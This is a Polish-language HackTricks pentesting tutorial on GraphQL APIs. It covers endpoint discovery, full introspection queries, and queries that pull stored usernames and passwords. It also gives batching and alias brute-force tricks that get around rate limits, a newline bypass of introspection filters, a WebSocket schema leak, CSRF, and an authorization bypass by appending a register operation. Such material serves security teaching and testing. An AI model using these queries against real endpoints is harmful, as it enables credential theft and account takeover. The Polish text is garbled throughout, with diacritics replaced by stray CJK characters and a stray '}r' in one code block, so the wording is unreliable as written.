# GraphQL

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Wprowadzenie

GraphQL jest **wyr贸偶niany** jako **efektywna alternatywa** dla interfejsu API REST, oferujc uproszczone podejcie do pobierania danych z backendu. W przeciwiestwie do REST, kt贸ry czsto wymaga wielu 偶da do r贸偶nych punkt贸w kocowych w celu zebrania danych, GraphQL umo偶liwia pobranie wszystkich wymaganych informacji za pomoc **jednego 偶dania**. Ten proces usprawnia znacznie prac programist贸w, zmniejszajc zo偶ono ich proces贸w pobierania danych.

## GraphQL a Bezpieczestwo

Wraz z pojawieniem si nowych technologii, w tym GraphQL, pojawiaj si r贸wnie偶 nowe podatnoci bezpieczestwa. Istotnym punktem do zauwa偶enia jest to, 偶e **GraphQL nie zawiera domylnie mechanizm贸w uwierzytelniania**. Odpowiedzialno za wdro偶enie takich rodk贸w bezpieczestwa spoczywa na programistach. Bez odpowiedniego uwierzytelnienia punkty kocowe GraphQL mog ujawnia poufne informacje nieuwierzytelnionym u偶ytkownikom, stanowic znaczne ryzyko bezpieczestwa.

### Ataki Brute Force na Katalogi i GraphQL

Aby zidentyfikowa wystawione instancje GraphQL, zaleca si uwzgldnienie okrelonych cie偶ek w atakach brute force na katalogi. Te cie偶ki to:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Zidentyfikowanie otwartych instancji GraphQL pozwala na zbadanie obsugiwanych zapyta. Jest to kluczowe dla zrozumienia danych dostpnych poprzez punkt kocowy. System introspekcji GraphQL uatwia to, szczeg贸owo opisujc zapytania, kt贸re obsuguje schemat. Aby uzyska wicej informacji na ten temat, zapoznaj si z dokumentacj GraphQL dotyczc introspekcji: [**GraphQL: Jzyk zapyta dla interfejs贸w API.**](https://graphql.org/learn/introspection/)

### Odcisk palca

Narzdzie [**graphw00f**](https://github.com/dolevf/graphw00f) jest zdolne do wykrywania, kt贸ry silnik GraphQL jest u偶ywany na serwerze, a nastpnie drukuje przydatne informacje dla audytora bezpieczestwa.

#### Uniwersalne zapytania <a href="#universal-queries" id="universal-queries"></a>

Aby sprawdzi, czy dany URL jest usug GraphQL, mo偶na wysa **uniwersalne zapytanie**, `query{__typename}`. Jeli odpowied藕 zawiera `{"data": {"__typename": "Query"}}`, potwierdza to, 偶e URL hostuje punkt kocowy GraphQL. Ta metoda polega na polu `__typename` GraphQL, kt贸re ujawnia typ zapytanego obiektu.
```javascript
query{__typename}
```
### Podstawowa enumeracja

GraphQL zazwyczaj obsuguje **GET**, **POST** (x-www-form-urlencoded) i **POST**(json). Chocia偶 ze wzgld贸w bezpieczestwa zaleca si zezwala tylko na json, aby zapobiec atakom CSRF.

#### Introspekcja

Aby u偶y introspekcji do odkrywania informacji o schemacie, zapytaj pole `__schema`. To pole jest dostpne w g贸wnym typie wszystkich zapyta.
```bash
query={__schema{types{name,fields{name}}}}
```
Z tym zapytaniem znajdziesz nazw wszystkich u偶ywanych typ贸w:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Z tym zapytaniem mo偶esz wydoby wszystkie typy, ich pola i argumenty (oraz typ argument贸w). Bdzie to bardzo przydatne, aby wiedzie, jak zapyta baz danych.

![](<../../.gitbook/assets/image (950).png>)

**Bdy**

Interesujce jest, czy **bdy** zostan **wywietlone**, poniewa偶 przyczyni si do uzyskania przydatnych **informacji**.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**Wylicz schemat bazy danych za pomoc introspekcji**

{% hint style="info" %}
Jeli introspekcja jest wczona, ale powy偶sze zapytanie nie dziaa, spr贸buj usun dyrektywy `onOperation`, `onFragment` i `onField` z struktury zapytania.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Zapytanie o inspekcj w linii:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Ostatnia linia kodu to zapytanie graphql, kt贸re wycignie wszystkie metadane z graphql (nazwy obiekt贸w, parametry, typy...)

![](<../../.gitbook/assets/image (363).png>)

Jeli introspekcja jest wczona, mo偶esz u偶y [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager), aby zobaczy w interfejsie graficznym wszystkie opcje.

### Zapytywanie

Teraz, gdy wiemy, jakie informacje s zapisane w bazie danych, spr贸bujmy **wydoby pewne wartoci**.

W introspekcji mo偶esz znale藕 **kt贸ry obiekt mo偶esz bezporednio zapyta** (poniewa偶 nie mo偶esz zapyta obiektu tylko dlatego, 偶e istnieje). Na poni偶szym obrazku mo偶esz zobaczy, 偶e "_queryType_" nazywa si "_Query_" i 偶e jednym z p贸l obiektu "_Query_" jest "_flags_", kt贸ry r贸wnie偶 jest typem obiektu. Dlatego mo偶esz zapyta obiekt flagi.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Zauwa偶, 偶e typ zapytania "_flags_" to "_Flags_", a ten obiekt jest zdefiniowany jak poni偶ej:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Mo偶esz zobaczy, 偶e obiekty "_Flags_" skadaj si z **nazwy** i **wartoci**. Nastpnie mo偶esz uzyska wszystkie nazwy i wartoci flag za pomoc zapytania:
```javascript
query={flags{name, value}}
```
Zauwa偶, 偶e w przypadku **obiektu do zapytania** bdcego **typem podstawowym** jak **string** jak w poni偶szym przykadzie

![](<../../.gitbook/assets/image (958).png>)

Mo偶esz po prostu zapyta o to:
```javascript
query={hiddenFlags}
```
W innym przykadzie, gdzie wewntrz obiektu typu "_Query_" byy 2 obiekty: "_user_" i "_users_".\
Jeli te obiekty nie wymagaj 偶adnego argumentu do wyszukiwania, mo偶na **pobra wszystkie informacje z nich** pytajc o dane, kt贸rych chcesz. W tym przykadzie z Internetu mo偶na wydoby zapisane nazwy u偶ytkownik贸w i hasa:

![](<../../.gitbook/assets/image (880).png>)

Jednak偶e, w tym przykadzie, jeli spr贸bujesz to zrobi, otrzymasz ten **bd**:

![](<../../.gitbook/assets/image (1042).png>)

Wyglda na to, 偶e w jaki spos贸b bdzie wyszukiwa u偶ywajc argumentu "_**uid**_" typu _**Int**_.\
W ka偶dym razie, ju偶 wiedzielimy, 偶e w sekcji [Podstawowa Enumeracja](graphql.md#basic-enumeration) zaproponowano zapytanie, kt贸re pokazywao nam wszystkie potrzebne informacje: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Jeli przeczytasz obrazek dostarczony podczas uruchamiania tego zapytania, zobaczysz, 偶e "_**user**_" mia **arg** "_**uid**_" typu _Int_.

Wic, wykonujc lekkie bruteforce _**uid**_ odkryem, 偶e dla _**uid**=**1**_ zostaa pobrana nazwa u偶ytkownika i haso:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Zauwa偶, 偶e **odkryem**, 偶e mog prosi o **parametry** "_**user**_" i "_**password**_", poniewa偶 jeli spr贸buj szuka czego, czego nie ma (`query={user(uid:1){noExists}}`) otrzymam ten bd:

![](<../../.gitbook/assets/image (707).png>)

Podczas fazy **enumeracji** odkryem, 偶e obiekt "_**dbuser**_" mia jako pola "_**user**_" i "_**password**_.

**Sztuczka z wyciekiem cigu zapyta (dziki @BinaryShadow\_)**

Jeli mo偶esz szuka wedug typu cig贸w, np.: `query={theusers(description: ""){username,password}}` i **szukasz pustego cigu**, wtedy **wycieknie cae dane**. (_Zauwa偶, 偶e ten przykad nie jest zwizany z przykadem z samouczk贸w, dla tego przykadu za贸偶, 偶e mo偶esz szuka u偶ywajc "**theusers**" wedug pola typu cig "**description**"_).

### Wyszukiwanie

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** s identyfikowane przez swoje **adresy e-mail** i **imi**; **filmy** przez swoje **nazwy** i **ocen**. **Osoby** mog by przyjaci贸mi midzy sob oraz mie filmy, co wskazuje na relacje w bazie danych.

Mo偶esz **wyszukiwa** osoby **po** imieniu i otrzymywa ich adresy e-mail:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Mo偶esz **wyszukiwa** osoby **po** nazwie i otrzyma list ich **subskrybowanych** film贸w:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Zauwa偶, jak wskazano na pobranie `name` z `subscribedMovies` osoby.

Mo偶esz r贸wnie偶 **wyszukiwa kilka obiekt贸w jednoczenie**. W tym przypadku wyszukiwane s 2 filmy:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Lub nawet **relacje kilku r贸偶nych obiekt贸w za pomoc alias贸w**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacje

**Mutacje s u偶ywane do wprowadzania zmian po stronie serwera.**

W **introspekcji** mo偶na znale藕 **zadeklarowane** **mutacje**. Na poni偶szym obrazku "_MutationType_" jest nazywany "_Mutation_", a obiekt "_Mutation_" zawiera nazwy mutacji (takie jak "_addPerson_" w tym przypadku):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** s identyfikowane przez sw贸j **adres e-mail** i **imi**; **filmy** przez swoj **nazw** i **ocen**. **Osoby** mog by przyjaci贸mi midzy sob oraz mie przypisane filmy, co wskazuje na relacje w bazie danych.

Mutacja dodajca **nowe filmy** do bazy danych mo偶e wyglda jak poni偶sza (w tym przykadzie mutacja nazywa si `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Zauwa偶, jak w zapytaniu wskazane s zar贸wno wartoci, jak i typ danych.**

Dodatkowo, baza danych obsuguje operacj **mutacji**, o nazwie `addPerson`, kt贸ra umo偶liwia tworzenie **os贸b** wraz z ich powizaniami z istniejcymi **przyjaci贸mi** i **filmami**. Wa偶ne jest, aby zauwa偶y, 偶e przyjaciele i filmy musz istnie w bazie danych przed ich powizaniem z nowo utworzon osob.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Przeci偶anie dyrektyw

Jak wyjaniono w [**jednej z podatnoci opisanych w tym raporcie**](https://www.landh.tech/blog/20240304-google-hack-50000/), przeci偶enie dyrektyw polega na wielokrotnym wywoaniu dyrektywy nawet miliony razy, aby zmusi serwer do marnowania operacji, a偶 bdzie mo偶liwe przeprowadzenie ataku typu DoS.

### czenie atak贸w siowych w 1 偶daniu API

Ta informacja zostaa zaczerpnita z [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Uwierzytelnianie poprzez interfejs API GraphQL z **r贸wnoczesnym wysyaniem wielu zapyta z r贸偶nymi danymi uwierzytelniajcymi** w celu sprawdzenia go. To klasyczny atak siowy, ale teraz mo偶liwe jest wysanie wicej ni偶 jednej pary login/haso w jednym 偶daniu HTTP ze wzgldu na funkcj czenia zapyta GraphQL. Ten spos贸b dziaania zmyli zewntrzne aplikacje monitorujce czstotliwo, sugerujc, 偶e wszystko jest w porzdku i nie ma bot贸w pr贸bujcych odgadn hasa.

Poni偶ej znajdziesz najprostsz demonstracj 偶dania uwierzytelniajcego aplikacji, z **3 r贸偶nymi parami email/haso jednoczenie**. Oczywicie mo偶liwe jest wysanie tysicy w jednym 偶daniu w ten sam spos贸b:

![](<../../.gitbook/assets/image (1081).png>)

Jak wida na zrzucie ekranu odpowiedzi, pierwsze i trzecie 偶dania zwr贸ciy _null_ i odzwierciedliy odpowiednie informacje w sekcji _error_. **Druga mutacja miaa poprawne dane uwierzytelniajce** i odpowied藕 zawieraa poprawny token sesji uwierzytelniajcej.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Bez Introspekcji

Coraz wicej **punkt贸w kocowych GraphQL wycza introspekcj**. Jednak bdy, kt贸re GraphQL zwraca, gdy otrzymuje nieoczekane 偶danie, s wystarczajce dla narzdzi takich jak [**clairvoyance**](https://github.com/nikitastupin/clairvoyance), aby odtworzy wikszo schematu.

Co wicej, rozszerzenie Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **obserwuje 偶dania interfejsu API GraphQL przechodzce przez Burp** i **tworzy** wewntrzny GraphQL **schemat** z ka偶dym nowym zapytaniem, kt贸re widzi. Mo偶e r贸wnie偶 ujawni schemat dla GraphiQL i Voyager. Rozszerzenie zwraca faszyw odpowied藕, gdy otrzymuje zapytanie introspekcyjne. W rezultacie GraphQuail pokazuje wszystkie zapytania, argumenty i pola dostpne do u偶ycia w interfejsie API. Aby uzyska wicej informacji, [**sprawd藕 to**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

adna **lista s贸w** do odkrywania [**encji GraphQL mo偶na znale藕 tutaj**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Omijanie obrony przed introspekcj GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Aby omin ograniczenia dotyczce zapyta introspekcyjnych w interfejsach API, skuteczne okazuje si wstawienie **specjalnego znaku po sowie kluczowym `__schema`**. Ta metoda wykorzystuje powszechne przeoczenia programist贸w w wzorcach wyra偶e regularnych, kt贸re maj na celu zablokowanie introspekcji poprzez skupienie si na sowie kluczowym `__schema`. Dodajc znaki takie jak **spacje, nowe linie i przecinki**, kt贸re GraphQL ignoruje, ale mog nie by uwzgldnione w wyra偶eniach regularnych, mo偶na obej ograniczenia. Na przykad zapytanie introspekcyjne z now lini po `__schema` mo偶e omin takie zabezpieczenia:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Jeli nie powiedzie si, rozwa偶 alternatywne metody 偶dania, takie jak **偶dania GET** lub **POST z `x-www-form-urlencoded`**, poniewa偶 ograniczenia mog dotyczy tylko 偶da POST.

### Spr贸buj WebSockets

Jak wspomniano w [**tym wystpieniu**](https://www.youtube.com/watch?v=tIo\_t5uUK50), sprawd藕, czy mo偶liwe jest poczenie z graphQL za pomoc WebSockets, poniewa偶 mo偶e to umo偶liwi ominiecie potencjalnego WAF i sprawi, 偶e komunikacja websocketowa ujawni schemat graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Odkrywanie ujawnionych struktur GraphQL**

Kiedy introspekcja jest wyczona, badanie kodu 藕r贸dowego witryny w poszukiwaniu wczeniej zaadowanych zapyta w bibliotekach JavaScript jest przydatn strategi. Te zapytania mo偶na znale藕, korzystajc z karty `Sources` w narzdziach deweloperskich, co pozwala uzyska wgld w schemat API i ujawni potencjalnie **ujawnione wra偶liwe zapytania**. Polecenia do wyszukiwania w narzdziach deweloperskich to:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF w GraphQL

Jeli nie wiesz, czym jest CSRF, przeczytaj nastpujc stron:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Mo偶esz tam znale藕 kilka punkt贸w kocowych GraphQL **skonfigurowanych bez token贸w CSRF.**

Zauwa偶, 偶e zazwyczaj 偶dania GraphQL s wysyane za pomoc 偶da POST z u偶yciem Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Jednak wikszo punkt贸w kocowych GraphQL obsuguje r贸wnie偶 偶dania POST w formacie **`form-urlencoded`:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Dlatego, poniewa偶 偶dania CSRF, takie jak poprzednie, s wysyane **bez 偶da wstpnych**, mo偶liwe jest **wykonanie** **zmian** w GraphQL nadu偶ywajc CSRF.

Nale偶y jednak zauwa偶y, 偶e nowa domylna warto ciasteczka flagi `samesite` w Chrome to `Lax`. Oznacza to, 偶e ciasteczko bdzie wysyane tylko z witryny zewntrznej w 偶daniach GET.

Nale偶y pamita, 偶e zazwyczaj mo偶liwe jest wysanie **偶dania** **zapytania** r贸wnie偶 jako **偶danie GET i token CSRF mo偶e nie by weryfikowany w 偶daniu GET.**

Ponadto, nadu偶ywajc ataku [**XS-Search**](../../pentesting-web/xs-search/) mo偶e by mo偶liwe wyciek treci z punktu kocowego GraphQL nadu偶ywajc powiadcze u偶ytkownika.

Aby uzyska wicej informacji, **sprawd藕** [**oryginalny post tutaj**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Przechwytywanie WebSocket midzy witrynami w GraphQL

Podobnie jak w przypadku podatnoci CRSF nadu偶ywajcych GraphQL, mo偶liwe jest r贸wnie偶 wykonanie **przechwycenia WebSocket midzy witrynami, aby nadu偶y uwierzytelnienia z GraphQL z niezabezpieczonymi ciasteczkami** i sprawi, by u偶ytkownik wykona nieoczekiwane dziaania w GraphQL.

Aby uzyska wicej informacji, sprawd藕:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Autoryzacja w GraphQL

Wiele funkcji GraphQL zdefiniowanych na punkcie kocowym mo偶e sprawdza tylko uwierzytelnienie 偶dajcego, ale nie autoryzacj.

Modyfikowanie zmiennych wejciowych zapytania mo偶e prowadzi do ujawnienia wra偶liwych szczeg贸贸w konta [ujawnionych](https://hackerone.com/reports/792927).

Mutacja mo偶e nawet prowadzi do przejcia konta, pr贸bujc zmodyfikowa dane innego konta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Ominicie autoryzacji w GraphQL

[czenie zapyta](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) mo偶e omin saby system uwierzytelniania.

W poni偶szym przykadzie mo偶na zobaczy, 偶e operacja to "forgotPassword" i powinna wykona tylko zwizane z ni zapytanie forgotPassword. Mo偶na to omin dodajc zapytanie na kocu, w tym przypadku dodajemy "register" i zmienn u偶ytkownika, aby system zarejestrowa nowego u偶ytkownika.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Ominicie limit贸w szybkoci za pomoc alias贸w w GraphQL

W GraphQL aliasy s pot偶n funkcj, kt贸ra pozwala **nazwa waciwoci w spos贸b jawny** podczas wysyania 偶dania API. Ta funkcjonalno jest szczeg贸lnie przydatna do pobierania **wielu instancji tego samego typu** obiektu w jednym 偶daniu. Aliasy mog by wykorzystane do pokonania ograniczenia, kt贸re uniemo偶liwia obiektom GraphQL posiadanie wielu waciwoci o tej samej nazwie.

Dla szczeg贸owego zrozumienia alias贸w w GraphQL, zalecane jest skorzystanie z nastpujcego 藕r贸da: [Aliasy](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Podczas gdy g贸wnym celem alias贸w jest zmniejszenie koniecznoci wielu wywoa API, zidentyfikowano niezamierzone zastosowanie, gdzie aliasy mog by wykorzystane do przeprowadzania atak贸w brutalnej siy na punkt kocowy GraphQL. Jest to mo偶liwe, poniewa偶 niekt贸re punkty kocowe s chronione przez ograniczniki szybkoci zaprojektowane do zwalczania atak贸w brutalnej siy poprzez ograniczenie **liczby 偶da HTTP**. Jednak偶e te ograniczniki szybkoci mog nie uwzgldnia liczby operacji w ka偶dym 偶daniu. Poniewa偶 aliasy pozwalaj na dodanie wielu zapyta w jednym 偶daniu HTTP, mog one obej takie rodki ograniczajce szybko.

Rozwa偶 poni偶szy przykad, kt贸ry ilustruje, jak zapytania z aliasami mog by u偶yte do weryfikacji poprawnoci kod贸w rabatowych sklepu. Ta metoda mogaby omin ograniczenia szybkoci, poniewa偶 kompiluje kilka zapyta w jedno 偶danie HTTP, potencjalnie umo偶liwiajc weryfikacj licznych kod贸w rabatowych jednoczenie.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Narzdzia

### Skanery podatnoci

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testuje powszechne bdy konfiguracyjne punkt贸w kocowych graphql
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Skrypt audytu bezpieczestwa GraphQL z naciskiem na wykonywanie wsadowych zapyta i mutacji GraphQL.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Identyfikuje u偶ywany graphql
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Zestaw narzdzi do pobierania schemat贸w, wyszukiwania danych poufnych, testowania autoryzacji, brutalnego przeszukiwania schemat贸w i znajdowania cie偶ek do okrelonego typu.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Mo偶e by u偶ywany samodzielnie lub jako [rozszerzenie Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Mo偶e by u偶ywany jako klient CLI do automatyzacji atak贸w
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Narzdzie wymieniajce r贸偶ne sposoby **dotarcia do okrelonego typu w schemacie GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Nastpca trybu samodzielnego i CLI InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Rozszerzenie Burp do zaawansowanego testowania GraphQL. Komponent _**Scanner**_ stanowi rdze InQL v5.0, gdzie mo偶na analizowa punkt kocowy GraphQL lub lokalny plik schematu introspekcji. Automatycznie generuje wszystkie mo偶liwe zapytania i mutacje, organizujc je w strukturalny widok do analizy. Skadnik _**Attacker**_ pozwala uruchamia wsadowe ataki GraphQL, co mo偶e by przydatne do omijania sabo zaimplementowanych limit贸w szybkoci.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Pr贸buje uzyska schemat nawet przy wyczonej introspekcji, korzystajc z pomocy niekt贸rych baz danych Graphql, kt贸re sugeruj nazwy mutacji i parametr贸w.

### Klienci

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Klient GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Klient GUI

### Automatyczne testy

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Wideo wyjaniajce AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Odnoniki

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF** sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
